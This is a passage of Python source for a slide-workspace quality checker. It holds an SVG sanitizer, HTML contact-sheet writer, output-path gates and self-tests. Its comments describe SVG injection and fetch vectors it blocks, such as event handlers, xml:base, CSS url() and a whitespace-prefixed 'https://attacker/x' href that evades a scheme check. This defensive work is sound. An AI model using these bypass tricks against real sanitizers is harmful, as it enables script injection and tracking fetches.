            # '{http://www.w3.org/1999/xlink}href'. Strip the namespace
            # prefix so the policy check works regardless of namespace,
            # and case-fold so a case-corrected HTML host parser
            # cannot smuggle in `ONLOAD` / `XLINK:HREF` / `XML:BASE`
            # variants.
            local = attr_name.split("}", 1)[-1].lower()
            # xml:base rewrites the base URL used to resolve every
            # relative href in the document. Refuse it outright on
            # any element — the generator never emits it, and even
            # one occurrence on the <svg> root would turn every safe
            # workspace-relative href into a fetch against the
            # attacker-controlled base. The match is case-insensitive:
            # the canonical qualified form via the XML namespace is
            # what we check first, and the local-name-only fallback
            # catches case variants of the unqualified `xml:base`.
            if attr_name == _XML_BASE_ATTR or local == "base":
                return None, (
                    f"contains xml:base attribute on <{tag}> "
                    f"(would rewrite the base URL for every "
                    f"relative href in the document — refused)"
                )
            if local.startswith("on"):
                return None, (
                    f"contains event-handler attribute {attr_name!r}"
                )
            if local == "style":
                return None, (
                    f"contains style attribute on <{tag}> "
                    f"(CSS execution vector — refused for inline)"
                )
            # CSS url(...) references in any attribute value can
            # fetch external resources to resolve the referenced
            # paint server / filter / mask / cursor. The generator
            # never emits url(...) in any attribute, so the substring
            # is treated as inherently unsafe regardless of which
            # element / attribute carries it.
            if isinstance(attr_value, str) and _URL_FUNC_RE.search(attr_value):
                return None, (
                    f"contains CSS url(...) reference in attribute "
                    f"{attr_name}={attr_value!r} on <{tag}> "
                    f"(CSS url(...) values fetch external resources "
                    f"to resolve paint servers / filters / masks / "
                    f"cursors — refused for inline)"
                )
            if local in ("href", "src") or local.endswith("href"):
                if not isinstance(attr_value, str):
                    return None, (
                        f"contains non-string reference attribute "
                        f"{attr_name}={attr_value!r} on <{tag}>"
                    )
                # Per HTML5 + url-parser specs, browsers strip leading
                # and trailing whitespace from URL attribute values
                # before resolving the URL. So " https://attacker/x"
                # (leading space) would BYPASS local_path_is_safe's
                # URI-scheme regex (which is anchored at the start of
                # the string and expects [A-Za-z], not whitespace) and
                # still get fetched by the browser as "https://attacker/x".
                # Refuse any href whose raw value differs from its
                # stripped form — including leading/trailing spaces,
                # tabs, newlines, and Unicode whitespace.
                if attr_value != attr_value.strip():
                    return None, (
                        f"contains reference attribute "
                        f"{attr_name}={attr_value!r} on <{tag}> with "
                        f"surrounding whitespace (browser URL parsers "
                        f"strip leading/trailing whitespace before "
                        f"resolving the URL — refused to prevent the "
                        f"local-path-safety gate from being bypassed "
                        f"by a leading space/tab/newline before a URI "
                        f"scheme or '/' character)"
                    )
                if not local_path_is_safe(attr_value):
                    return None, (
                        f"contains unsafe reference attribute "
                        f"{attr_name}={attr_value!r} on <{tag}> "
                        f"(must be a workspace-relative local path — "
                        f"no URI scheme, no leading '/', no protocol-"
                        f"relative '//', no leading '\\', no '..' "
                        f"segment, no empty value)"
                    )
    return root, ""


def _strip_fetchable_attrs(root: object) -> None:
    """Remove every ``href`` / ``src`` / ``xlink:href`` / ``*href``
    attribute from every element in the tree IN PLACE.

    The safety check above already refuses URI schemes, protocol-
    relative, POSIX-absolute, leading-backslash, ``..`` traversal,
    whitespace-prefixed, and empty values. But a workspace-relative path
    that PASSES ``local_path_is_safe`` (e.g. ``generated_assets/cover.png``
    on a legitimate ``<image>`` element emitted by
    ``generate_svg_previews.py``) is STILL fetched by the browser when
    the inlined SVG is rendered — the path resolves against the HTML
    host directory, which ``_validate_output_path`` requires to be
    OUTSIDE the workspace by design. The fetch reaches the local
    filesystem, finds nothing, and 404s — but it IS a fetch, and the
    contact sheet promises to be self-contained (no fetch on open). So
    strip the fetchable surface entirely. The geometry stays (the
    ``<image>`` element keeps its ``x`` / ``y`` / ``width`` / ``height``);
    only the reference attribute is removed."""
    for el in root.iter():  # type: ignore[attr-defined]
        if not isinstance(el.tag, str):
            continue
        to_remove: list[str] = []
        for k in el.attrib:
            if not isinstance(k, str):
                continue
            local = k.split("}", 1)[-1].lower()
            if local in ("href", "src") or local.endswith("href"):
                to_remove.append(k)
        for k in to_remove:
            del el.attrib[k]


def _inline_svg(svg_text: str) -> str:
    """Return safe inline SVG markup OR a textual fallback notice.

    The returned string is appended directly inside the contact sheet's
    HTML body, so anything we paste here lands in the host page's DOM.
    To stop a malicious or hand-edited SVG from executing scripts /
    fetching remote assets in the user's browser, we parse the SVG,
    refuse to inline it on any policy violation, and re-serialize the
    PARSED tree (rather than the original bytes) when it passes.
    Re-serialization strips XML declarations, DOCTYPEs, processing
    instructions, and comments — none of which belong in an HTML host
    page.

    The second layer (``_strip_fetchable_attrs``) removes every
    ``href`` / ``src`` / ``xlink:href`` / ``*href`` attribute from the
    re-serialized tree — even values that passed
    ``local_path_is_safe``. The reason: a legitimate
    ``<image href="generated_assets/cover.png">`` (workspace-relative,
    safe by the path-safety gate) STILL gets fetched by the browser
    against the HTML host directory, which is OUTSIDE the workspace by
    design. The contact sheet's self-containment promise requires that
    no fetch happen on open, so the fetchable surface is removed
    entirely.

    Note: ``ET.tostring`` emits a tree-rooted serialization; SVG
    namespace declarations are folded into the root element so the
    result is a self-contained ``<svg xmlns="...">...</svg>`` fragment
    suitable for inline embedding."""
    import xml.etree.ElementTree as ET
    root, reason = _svg_safety_check(svg_text)
    if root is None:
        return (
            f'<div class="no-svg">SVG not embedded (unsafe for inline): '
            f'{html.escape(reason)}</div>'
        )
    _strip_fetchable_attrs(root)
    # Register the default SVG namespace so ``ET.tostring`` emits
    # ``xmlns="http://www.w3.org/2000/svg"`` on the root element rather
    # than the synthetic ``xmlns:ns0=...`` prefix it would otherwise
    # generate. ``register_namespace`` is module-global; calling it
    # repeatedly is idempotent and safe.
    ET.register_namespace("", SVG_NS)
    ET.register_namespace("xlink", "http://www.w3.org/1999/xlink")
    return ET.tostring(root, encoding="unicode")


def _write_html_report(
    report: WorkspaceReport, output: Path, workspace: Path,
) -> None:
    """Emit a self-contained HTML contact sheet. Every SVG is inlined;
    no ``file://`` references, no remote assets, no JS / no fetch.
    The contact sheet is intended for local inspection only."""
    pieces: list[str] = []
    pieces.append("<!doctype html>")
    pieces.append('<html lang="en"><head><meta charset="utf-8">')
    pieces.append(
        f"<title>{html.escape(workspace.name)} — visual quality contact sheet</title>",
    )
    pieces.append("<style>")
    pieces.append(
        "body{font-family:system-ui,sans-serif;margin:24px;background:#f7f7f7;"
        "color:#1a1a1a;}"
        "h1{font-size:1.2rem;margin:0 0 12px}"
        ".summary{background:#fff;padding:12px;border:1px solid #ddd;"
        "border-radius:6px;margin-bottom:24px}"
        ".grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(360px,1fr));"
        "gap:16px}"
        ".card{background:#fff;border:1px solid #ddd;border-radius:6px;"
        "padding:12px;overflow:hidden}"
        ".card h2{font-size:0.95rem;margin:0 0 8px;color:#444}"
        ".card .meta{font-size:0.8rem;color:#555;margin-bottom:8px}"
        ".card svg{width:100%;height:auto;border:1px solid #eee;background:#fff}"
        ".finding{font-size:0.8rem;margin-top:8px}"
        ".finding.error{color:#a00}"
        ".finding.warn{color:#a86}"
        ".finding.error::before{content:'[ERROR] '}"
        ".finding.warn::before{content:'[WARN] '}"
        ".no-svg{font-size:0.8rem;color:#a00;padding:18px;text-align:center;"
        "border:1px dashed #a00;border-radius:4px}",
    )
    pieces.append("</style></head><body>")
    pieces.append(
        f"<h1>{html.escape(workspace.name)} — visual quality contact sheet</h1>",
    )
    pieces.append('<div class="summary">')
    pieces.append(
        f"<div>slides: {report.slide_count_render_models} render_models, "
        f"deck_plan={report.slide_count_deck_plan}</div>",
    )
    pieces.append(f"<div>missing SVG previews: {report.missing_svg_count}</div>")
    if report.layout_distribution:
        layout_list = ", ".join(
            f"{html.escape(name)}={count}"
            for name, count in sorted(report.layout_distribution.items())
        )
        pieces.append(f"<div>layout distribution: {layout_list}</div>")
    pieces.append(
        f"<div>totals: {report.total_errors} errors, "
        f"{report.total_warnings} warnings</div>",
    )
    if report.workspace_findings:
        pieces.append("<div>workspace findings:</div>")
        for f in report.workspace_findings:
            klass = "error" if f.severity == "ERROR" else "warn"
            pieces.append(
                f'<div class="finding {klass}">{html.escape(f.name)}'
                f'{": " + html.escape(f.detail) if f.detail else ""}</div>',
            )
    pieces.append("</div>")
    pieces.append('<div class="grid">')
    for s in report.slides:
        pieces.append('<div class="card">')
        pieces.append(
            f"<h2>{html.escape(s.stem)} — {html.escape(str(s.layout))}</h2>",
        )
        pieces.append(
            f'<div class="meta">'
            f'index={s.index}, primitives={s.primitive_count}, '
            f'text_chars={s.text_char_count}, '
            f'editable={"yes" if s.has_native_editable_primitive else "no"}'
            f'</div>',
        )
        if s.svg_path is not None:
            svg_full = (workspace / s.svg_path)
            try:
                svg_text = svg_full.read_text(encoding="utf-8")
                pieces.append(_inline_svg(svg_text))
            except OSError as exc:
                pieces.append(
                    f'<div class="no-svg">svg read error: '
                    f'{html.escape(str(exc))}</div>',
                )
        else:
            pieces.append('<div class="no-svg">no SVG preview</div>')
        for f in s.findings:
            klass = "error" if f.severity == "ERROR" else "warn"
            pieces.append(
                f'<div class="finding {klass}">{html.escape(f.name)}'
                f'{": " + html.escape(f.detail) if f.detail else ""}</div>',
            )
        pieces.append("</div>")
    pieces.append("</div></body></html>")
    output.write_text("\n".join(pieces) + "\n", encoding="utf-8")


# ---------------------------------------------------------------------------
# Output gates.
# ---------------------------------------------------------------------------


_URI_SCHEME_PREFIX = re.compile(r"^[A-Za-z][A-Za-z0-9+.\-]*:")


def _validate_output_path(output: Path, workspace: Path) -> str:
    """Return one of {'json', 'html'} or raise ValueError with a clear
    message. Mirrors run_pipeline's --output/--report-dir gates: refuse
    URI-shaped paths, symlinks, non-regular pre-existing paths, and any
    output that would land inside the workspace tree."""
    if _URI_SCHEME_PREFIX.match(str(output)):
        raise ValueError(f"--output looks like a URI: {output}")
    if output.is_symlink():
        raise ValueError(
            f"--output {output} is a symlink (refused; would silently follow)",
        )
    if output.exists() and not output.is_file():
        raise ValueError(
            f"--output {output} exists and is not a regular file (refused)",
        )
    suffix = output.suffix.lower()
    if suffix not in {".json", ".html"}:
        raise ValueError(
            f"--output must end in .json or .html; got {output}",
        )
    # Refuse output paths inside the workspace so the report cannot
    # accidentally end up next to the artifacts it inspects (which
    # the workspace validator would then refuse as a non-render_model
    # file in svg_previews/ or render_models/ if placed there).
    try:
        workspace_resolved = workspace.resolve()
        output_resolved = output.resolve()
        if (
            workspace_resolved == output_resolved
            or workspace_resolved in output_resolved.parents
        ):
            raise ValueError(
                f"--output must live outside --workspace; "
                f"got {output_resolved} inside {workspace_resolved}",
            )
    except OSError:
        # Resolving a not-yet-existing path under a missing parent is
        # fine; the write-time error message will surface anything else.
        pass
    return "html" if suffix == ".html" else "json"


# ---------------------------------------------------------------------------
# CLI.
# ---------------------------------------------------------------------------


def main(argv: list[str]) -> int:
    parser = argparse.ArgumentParser(
        description=(
            "Visual quality review gate over a workspace's "
            "render_models/*.json and svg_previews/*.svg. Inspection "
            "only — no rendering, no PPTX export, no network, no "
            "mutation. Optional --output writes a JSON report or a "
            "self-contained HTML contact sheet (inline SVG; no remote "
            "assets)."
        ),
    )
    parser.add_argument("--workspace", type=Path, default=None)
    parser.add_argument("--output", type=Path, default=None)
    parser.add_argument(
        "--strict", action="store_true",
        help="Promote every WARN finding to ERROR (exit 1 on any warning).",
    )
    parser.add_argument(
        "--self-test", action="store_true",
        help="Run in-script tempfixture scenarios (pass + fail cases). "
             "Mutually exclusive with the orchestration flags.",
    )
    args = parser.parse_args(argv)

    if args.self_test:
        if args.workspace is not None or args.output is not None or args.strict:
            print(
                "FAIL: --self-test does not take any other argument",
                file=sys.stderr,
            )
            return 2
        results = _run_self_tests()
        fails = 0
        for name, ok, detail in results:
            mark = "PASS" if ok else "FAIL"
            suffix = f" -- {detail}" if not ok and detail else ""
            print(f"  [{mark}] {name}{suffix}")
            if not ok:
                fails += 1
        print()
        if fails:
            print(f"FAIL: {fails} self-test scenario(s) did not behave as expected.")
            return 1
        print(
            f"OK (self-test): {len(results)} scenario(s) behaved as expected.",
        )
        return 0

    if args.workspace is None:
        print(
            "FAIL: --workspace is required (use --self-test for the "
            "in-script scenarios)",
            file=sys.stderr,
        )
        return 2

    if args.output is not None:
        try:
            output_kind = _validate_output_path(args.output, args.workspace)
        except ValueError as exc:
            print(f"FAIL: {exc}", file=sys.stderr)
            return 2
    else:
        output_kind = None

    report = inspect_workspace(args.workspace)
    print(_format_text_report(report))

    if output_kind == "json":
        _write_json_report(report, args.output)
    elif output_kind == "html":
        _write_html_report(report, args.output, args.workspace)

    if report.total_errors:
        return 1
    if args.strict and report.total_warnings:
        print(
            f"FAIL (strict): {report.total_warnings} warning(s) promoted to "
            f"error under --strict.",
            file=sys.stderr,
        )
        return 1
    return 0


# ---------------------------------------------------------------------------
# Self-test fixtures.
# ---------------------------------------------------------------------------


_CANVAS = {"width_px": 1920, "height_px": 1080}


def _write_json(path: Path, value: object) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(
        json.dumps(value, indent=2, sort_keys=True) + "\n",
        encoding="utf-8",
    )


def _good_render_model(
    index: int,
    layout: str,
    *,
    title_text: str = "Synthetic Heading That Is Long Enough",
    extra_primitives: list[dict] | None = None,
) -> dict:
    """A minimal-but-non-trivial render_model the validator should
    accept on every check. Title text is long enough to clear the
    text-density-low and near-empty thresholds; one extra shape
    primitive ensures the editable-intent check passes alongside an
    image_slot if the caller adds one."""
    primitives: list[dict] = [
        {
            "id": "title",
            "kind": "text",
            "bounds": {"x": 64, "y": 80, "w": 1792, "h": 120},
            "style": {
                "color_token": "palette.text",
                "typography_token": "typography.heading",
            },
            "text": {"content": title_text, "role": "heading"},
        },
        {
            "id": "underline",
            "kind": "line",
            "bounds": {"x": 64, "y": 220, "w": 1792, "h": 4},
            "style": {
                "stroke_token": "palette.primary",
                "stroke_width_px": 4,
            },
            "line": {"stroke_style": "solid"},
        },
    ]
    if extra_primitives:
        primitives.extend(extra_primitives)
    return {
        "index": index,
        "layout": layout,
        "canvas": dict(_CANVAS),
        "source_refs": ["synthetic_source"],
        "primitives": primitives,
    }


def _good_svg_for(rm: dict) -> str:
    """Generate a minimal SVG covering the same primitives without
    redoing the renderer. Geometry must stay inside the canvas so the
    out_of_canvas_svg gate passes."""
    lines = [
        '<?xml version="1.0" encoding="UTF-8"?>',
        '<svg xmlns="http://www.w3.org/2000/svg" '
        f'viewBox="0 0 {_CANVAS["width_px"]} {_CANVAS["height_px"]}" '
        f'width="{_CANVAS["width_px"]}" height="{_CANVAS["height_px"]}">',
        f'<rect x="0" y="0" width="{_CANVAS["width_px"]}" '
        f'height="{_CANVAS["height_px"]}" fill="#FFFFFF"/>',
    ]
    for p in rm.get("primitives") or []:
        b = p.get("bounds") or {}
        x, y, w, h = b.get("x", 0), b.get("y", 0), b.get("w", 0), b.get("h", 0)
        kind = p.get("kind")
        if kind == "text":
            content = ((p.get("text") or {}).get("content") or "")
            lines.append(
                f'<text x="{x + 8}" y="{y + 40}" font-family="Calibri" '
                f'font-size="24px" fill="#1A1A1A">{xml_escape(content)}</text>',
            )
        elif kind == "line":
            lines.append(
                f'<line x1="{x}" y1="{y}" x2="{x + w}" y2="{y + h}" '
                f'stroke="#1F3A5F" stroke-width="4"/>',
            )
        elif kind == "shape":
            lines.append(
                f'<rect x="{x}" y="{y}" width="{w}" height="{h}" '
                f'fill="#FFFFFF" stroke="#1F3A5F"/>',
            )
        elif kind == "image_slot":
            lines.append(
                f'<rect x="{x}" y="{y}" width="{w}" height="{h}" '
                f'fill="#EEEEEE"/>',
            )
    lines.append("</svg>")
    return "\n".join(lines) + "\n"


def _build_workspace(td: Path, *, slides: list[dict]) -> Path:
    """Build a minimal workspace at td with render_models/ and
    svg_previews/. Optionally writes a deck_plan.json that declares the
    same slide indices so the coverage cross-check has data to walk."""
    rm_dir = td / "render_models"
    sp_dir = td / "svg_previews"
    rm_dir.mkdir(parents=True, exist_ok=True)
    sp_dir.mkdir(parents=True, exist_ok=True)
    for rm in slides:
        stem = f"{rm['index']:02d}_{rm['layout']}"
        _write_json(rm_dir / f"{stem}.json", rm)
        (sp_dir / f"{stem}.svg").write_text(
            _good_svg_for(rm), encoding="utf-8",
        )
    _write_json(td / "deck_plan.json", {
        "template": "business_review",
        "planning": {
            "planned_slide_count": len(slides),
            "rationale": "self-test fixture",
        },
        "sections": [
            {"id": "all", "title": "All", "summary": "x",
             "slide_indices": [s["index"] for s in slides]},
        ],
        "slides": [
            {
                "index": s["index"], "layout": s["layout"],
                "title": "Synthetic",
                "section_id": "all", "summary": "x", "density": "low",
                "source_refs": ["synthetic_source"],
            }
            for s in slides
        ],
    })
    return td


def _has_finding(slide: SlideReport, name: str) -> bool:
    return any(f.name == name for f in slide.findings)


def _has_workspace_finding(report: WorkspaceReport, name: str) -> bool:
    return any(f.name == name for f in report.workspace_findings)


def _scenario(name: str, ok: bool, detail: str = "") -> tuple[str, bool, str]:
    return (name, ok, detail if not ok else "")


def _run_self_tests() -> list[tuple[str, bool, str]]:
    results: list[tuple[str, bool, str]] = []

    # 1. Happy path: every slide passes, no errors, no warnings.
    with tempfile.TemporaryDirectory() as raw_td:
        td = Path(raw_td) / "ws"
        _build_workspace(td, slides=[
            _good_render_model(1, "cover"),
            _good_render_model(2, "key_message"),
        ])
        report = inspect_workspace(td)
        ok = (
            report.total_errors == 0
            and report.total_warnings == 0
            and report.slide_count_render_models == 2
            and report.slide_count_deck_plan == 2
            and report.layout_distribution == {"cover": 1, "key_message": 1}
            and report.missing_svg_count == 0
            and all(s.has_native_editable_primitive for s in report.slides)
        )
        results.append(_scenario(
            "happy path: clean workspace → 0 errors, 0 warnings",
            ok,
            (
                f"errors={[(s.stem, [f.name for f in s.errors]) for s in report.slides]}, "
                f"warnings={[(s.stem, [f.name for f in s.warnings]) for s in report.slides]}, "
                f"workspace={[f.name for f in report.workspace_findings]}"
            ),
        ))

    # 2. Missing SVG preview.
    with tempfile.TemporaryDirectory() as raw_td:
        td = Path(raw_td) / "ws"
        _build_workspace(td, slides=[
            _good_render_model(1, "cover"),
        ])
        (td / "svg_previews" / "01_cover.svg").unlink()
        report = inspect_workspace(td)
        ok = (
            report.total_errors == 1
            and _has_finding(report.slides[0], "svg_missing")
            and report.missing_svg_count == 1
        )
        results.append(_scenario(
            "missing SVG preview flagged",
            ok,
            f"errors={[f.name for f in report.slides[0].errors]}",
        ))

    # 3. Blank slide: render_model with zero primitives.
    with tempfile.TemporaryDirectory() as raw_td:
        td = Path(raw_td) / "ws"
        rm = _good_render_model(1, "cover")
        rm["primitives"] = []
        _build_workspace(td, slides=[rm])
        report = inspect_workspace(td)
        ok = (
            _has_finding(report.slides[0], "blank_slide")
            and not report.slides[0].has_native_editable_primitive
        )
        results.append(_scenario(
            "blank slide (zero primitives) flagged",
            ok,
            f"errors={[f.name for f in report.slides[0].errors]}",
        ))

    # 4. Image-only slide warning AND missing-editable-primitive error.
    with tempfile.TemporaryDirectory() as raw_td:
        td = Path(raw_td) / "ws"
        rm = {
            "index": 1, "layout": "cover", "canvas": dict(_CANVAS),
            "source_refs": ["synthetic_source"],
            "primitives": [
                {
                    "id": "hero",
                    "kind": "image_slot",
                    "bounds": {"x": 0, "y": 0, "w": 1920, "h": 1080},
                    "image_slot": {
                        "image_ref": "hero_image", "alt_text": "Hero",
                    },
                },
            ],
        }
        _build_workspace(td, slides=[rm])
        report = inspect_workspace(td)
        slide = report.slides[0]
        ok = (
            _has_finding(slide, "image_only_slide")
            and _has_finding(slide, "no_native_editable_primitive")
            and not slide.has_native_editable_primitive
        )
        results.append(_scenario(
            "image-only slide (no editable primitive) flagged",
            ok,
            f"errors={[f.name for f in slide.errors]}, "
            f"warnings={[f.name for f in slide.warnings]}",
        ))

    # 5. All-placeholder slide warning.
    with tempfile.TemporaryDirectory() as raw_td:
        td = Path(raw_td) / "ws"
        rm = _good_render_model(
            1, "cover", title_text="Placeholder title content here",
        )
        rm["primitives"].append({
            "id": "subtitle",
            "kind": "text",
            "bounds": {"x": 64, "y": 240, "w": 1792, "h": 60},
            "style": {
                "color_token": "palette.text",
                "typography_token": "typography.body",
            },
            "text": {"content": "TBD placeholder subtitle", "role": "body"},
        })
        _build_workspace(td, slides=[rm])
        report = inspect_workspace(td)
        slide = report.slides[0]
        ok = _has_finding(slide, "all_placeholder_slide")
        results.append(_scenario(
            "all-placeholder text slide flagged",
            ok,
            f"warnings={[f.name for f in slide.warnings]}",
        ))

    # 6. Out-of-canvas render_model geometry.
    with tempfile.TemporaryDirectory() as raw_td:
        td = Path(raw_td) / "ws"
        rm = _good_render_model(1, "cover")
        rm["primitives"].append({
            "id": "bad_shape",
            "kind": "shape",
            "bounds": {"x": 1800, "y": 1000, "w": 400, "h": 200},
            "style": {"fill_token": "palette.primary"},
            "shape": {"shape_kind": "rectangle"},
        })
        _build_workspace(td, slides=[rm])
        report = inspect_workspace(td)
        slide = report.slides[0]
        ok = _has_finding(slide, "out_of_canvas_render_model")
        results.append(_scenario(
            "out-of-canvas render_model bounds flagged",
            ok,
            f"errors={[f.name for f in slide.errors]}",
        ))

    # 7. Out-of-canvas SVG geometry.
    with tempfile.TemporaryDirectory() as raw_td:
        td = Path(raw_td) / "ws"
        rm = _good_render_model(1, "cover")
        _build_workspace(td, slides=[rm])
        # Hand-write an SVG with a rect that exceeds the canvas.
        bad_svg = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<svg xmlns="http://www.w3.org/2000/svg" '
            f'viewBox="0 0 {_CANVAS["width_px"]} {_CANVAS["height_px"]}" '
            f'width="{_CANVAS["width_px"]}" height="{_CANVAS["height_px"]}">'
            '<rect x="1800" y="1000" width="400" height="200" fill="red"/>'
            '</svg>'
        )
        (td / "svg_previews" / "01_cover.svg").write_text(bad_svg, encoding="utf-8")
        report = inspect_workspace(td)
        slide = report.slides[0]
        ok = _has_finding(slide, "out_of_canvas_svg")
        results.append(_scenario(
            "out-of-canvas SVG geometry flagged",
            ok,
            f"errors={[f.name for f in slide.errors]}",
        ))

    # 8. Malformed SVG (unparseable) flagged.
    with tempfile.TemporaryDirectory() as raw_td:
        td = Path(raw_td) / "ws"
        rm = _good_render_model(1, "cover")
        _build_workspace(td, slides=[rm])
        (td / "svg_previews" / "01_cover.svg").write_text(
            "<svg><not-closed", encoding="utf-8",
        )
        report = inspect_workspace(td)
        slide = report.slides[0]
        ok = _has_finding(slide, "svg_unparseable")
        results.append(_scenario(
            "malformed SVG flagged as unparseable",
            ok,
            f"errors={[f.name for f in slide.errors]}",
        ))

    # 9. Render_model count vs deck_plan mismatch.
    with tempfile.TemporaryDirectory() as raw_td:
        td = Path(raw_td) / "ws"
        _build_workspace(td, slides=[
            _good_render_model(1, "cover"),
            _good_render_model(2, "key_message"),
        ])
        # Doctor the deck_plan to declare 3 slides.
        plan = json.loads((td / "deck_plan.json").read_text())
        plan["planning"]["planned_slide_count"] = 3
        plan["slides"].append({
            "index": 3, "layout": "conclusion", "title": "Synthetic",
            "section_id": "all", "summary": "x", "density": "low",
            "source_refs": ["synthetic_source"],
        })
        plan["sections"][0]["slide_indices"] = [1, 2, 3]
        _write_json(td / "deck_plan.json", plan)
        report = inspect_workspace(td)
        ok = _has_workspace_finding(report, "deck_plan_render_count_mismatch")
        results.append(_scenario(
            "deck_plan vs render_model count mismatch flagged",
            ok,
            f"workspace_findings={[f.name for f in report.workspace_findings]}",
        ))

    # 10. Empty render_models/ workspace flagged.
    with tempfile.TemporaryDirectory() as raw_td:
        td = Path(raw_td) / "ws"
        (td / "render_models").mkdir(parents=True)
        (td / "svg_previews").mkdir(parents=True)
        report = inspect_workspace(td)
        ok = (
            _has_workspace_finding(report, "render_models_empty")
            and not report.slides
        )
        results.append(_scenario(
            "empty render_models/ workspace flagged",
            ok,
            f"workspace_findings={[f.name for f in report.workspace_findings]}",
        ))

    # 11. Missing render_models/ directory flagged.
    with tempfile.TemporaryDirectory() as raw_td:
        td = Path(raw_td) / "ws"
        td.mkdir(parents=True)
        report = inspect_workspace(td)
        ok = _has_workspace_finding(report, "render_models_missing")
        results.append(_scenario(
            "missing render_models/ flagged",
            ok,
            f"workspace_findings={[f.name for f in report.workspace_findings]}",
        ))

    # 12. JSON output: round-trips with totals + per-slide histogram.
    with tempfile.TemporaryDirectory() as raw_td:
        td = Path(raw_td) / "ws"
        _build_workspace(td, slides=[_good_render_model(1, "cover")])
        out_path = Path(raw_td) / "report.json"
        report = inspect_workspace(td)
        _write_json_report(report, out_path)
        parsed = json.loads(out_path.read_text())
        ok = (
            parsed["slide_count_render_models"] == 1
            and "slides" in parsed and len(parsed["slides"]) == 1
            and parsed["slides"][0]["primitive_kind_histogram"]
            and parsed["totals"]["errors"] == 0
        )
        results.append(_scenario(
            "JSON --output emits machine-readable summary",
            ok,
            f"keys={sorted(parsed.keys())}",
        ))

    # 13. HTML output: self-contained, embeds SVG inline, NO fetchable
    #     attribute survives. ``xmlns="http://www.w3.org/2000/svg"`` is
    #     a namespace identifier (not a network fetch), so the assertion
    #     is scoped to actually-fetchable surfaces: any ``href`` / ``src``
    #     / ``xlink:href`` attribute at all in the body, plus any
    #     ``file://`` URL, plus any URI-shaped href value. The strip
    #     layer in ``_inline_svg`` is what makes this assertion true
    #     even when the workspace SVG carries
    #     ``<image href="generated_assets/cover.png">`` (a legitimate
    #     workspace-relative path that would otherwise fetch against
    #     the HTML host directory).
    with tempfile.TemporaryDirectory() as raw_td:
        td = Path(raw_td) / "ws"
        _build_workspace(td, slides=[_good_render_model(1, "cover")])
        out_path = Path(raw_td) / "report.html"
        report = inspect_workspace(td)
        _write_html_report(report, out_path, td)
        text = out_path.read_text()
        body_split = text.split("</style></head>", 1)
        body = body_split[1] if len(body_split) == 2 else text
        any_href_re = re.compile(
            r'(?:href|src|xlink:href)\s*=\s*"',
            re.IGNORECASE,
        )
        ok = (
            text.startswith("<!doctype html>")
            and "<svg " in text
            and "file://" not in text
            and not any_href_re.search(body)
        )
        results.append(_scenario(
            "HTML --output is self-contained (inline SVG, no href / "
            "src / xlink:href attribute survives in the body, no "
            "file:// references)",
            ok,
            f"contains_file_scheme={'file://' in text}, "
            f"any_fetchable_attr_in_body={bool(any_href_re.search(body))}",
        ))

    # 14. --output extension gate: anything other than .json/.html refused.
    with tempfile.TemporaryDirectory() as raw_td:
        td = Path(raw_td) / "ws"
        _build_workspace(td, slides=[_good_render_model(1, "cover")])
        out_path = Path(raw_td) / "report.txt"
        crashed = False
        msg = ""
        try:
            _validate_output_path(out_path, td)
        except ValueError as exc:
            crashed = True
            msg = str(exc)
        ok = crashed and ".json or .html" in msg
        results.append(_scenario(
            "--output extension other than .json/.html refused",
            ok,
            f"crashed={crashed}, msg={msg!r}",
        ))

    # 15. --output inside workspace refused.
    with tempfile.TemporaryDirectory() as raw_td:
        td = Path(raw_td) / "ws"
        _build_workspace(td, slides=[_good_render_model(1, "cover")])
        out_path = td / "report.json"
        crashed = False
        msg = ""
        try:
            _validate_output_path(out_path, td)
        except ValueError as exc:
            crashed = True
            msg = str(exc)
        ok = crashed and "outside --workspace" in msg
        results.append(_scenario(
            "--output inside the workspace refused",
            ok,
            f"crashed={crashed}, msg={msg!r}",
        ))

    # 16. Non-mutating: re-running inspect_workspace leaves every file
    #     byte-identical.
    with tempfile.TemporaryDirectory() as raw_td:
        td = Path(raw_td) / "ws"
        _build_workspace(td, slides=[
            _good_render_model(1, "cover"),
            _good_render_model(2, "key_message"),
        ])
        before: dict[Path, bytes] = {}
        for p in (
            *(td / "render_models").glob("*"),
            *(td / "svg_previews").glob("*"),
            td / "deck_plan.json",
        ):
            before[p] = p.read_bytes()
        inspect_workspace(td)
        inspect_workspace(td)
        unchanged = all(p.read_bytes() == b for p, b in before.items())
        results.append(_scenario(
            "non-mutating: repeated inspection leaves every file byte-identical",
            unchanged,
            "" if unchanged else "byte-level drift detected",
        ))

    # 17. Out-of-canvas <text> anchor in SVG flagged.
    with tempfile.TemporaryDirectory() as raw_td:
        td = Path(raw_td) / "ws"
        rm = _good_render_model(1, "cover")
        _build_workspace(td, slides=[rm])
        bad_svg = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<svg xmlns="http://www.w3.org/2000/svg" '
            f'viewBox="0 0 {_CANVAS["width_px"]} {_CANVAS["height_px"]}" '
            f'width="{_CANVAS["width_px"]}" height="{_CANVAS["height_px"]}">'
            '<text x="3000" y="500" fill="#000">Off canvas</text>'
            '</svg>'
        )
        (td / "svg_previews" / "01_cover.svg").write_text(bad_svg, encoding="utf-8")
        report = inspect_workspace(td)
        slide = report.slides[0]
        ok = _has_finding(slide, "out_of_canvas_svg")
        results.append(_scenario(
            "out-of-canvas <text> anchor flagged",
            ok,
            f"errors={[f.name for f in slide.errors]}",
        ))

    # 18. Workspace symlink refused.
    with tempfile.TemporaryDirectory() as raw_td:
        td = Path(raw_td) / "real_ws"
        _build_workspace(td, slides=[_good_render_model(1, "cover")])
        link = Path(raw_td) / "link_ws"
        link.symlink_to(td)
        report = inspect_workspace(link)
        ok = _has_workspace_finding(report, "workspace_symlink")
        results.append(_scenario(
            "workspace symlink refused",
            ok,
            f"workspace_findings={[f.name for f in report.workspace_findings]}",
        ))

    # 19. Strict mode promotes WARN to fail. We re-enter main() here so
    #     the CLI gate is exercised end-to-end; redirect stdout/stderr
    #     to suppress the report bodies from the self-test transcript.
    import contextlib
    import io
    with tempfile.TemporaryDirectory() as raw_td:
        td = Path(raw_td) / "ws"
        rm = _good_render_model(
            1, "cover", title_text="Placeholder title content here",
        )
        _build_workspace(td, slides=[rm])
        out_path = Path(raw_td) / "report.json"
        sink_out = io.StringIO()
        sink_err = io.StringIO()
        with contextlib.redirect_stdout(sink_out), contextlib.redirect_stderr(sink_err):
            rc_normal = main([
                "--workspace", str(td),
                "--output", str(out_path),
            ])
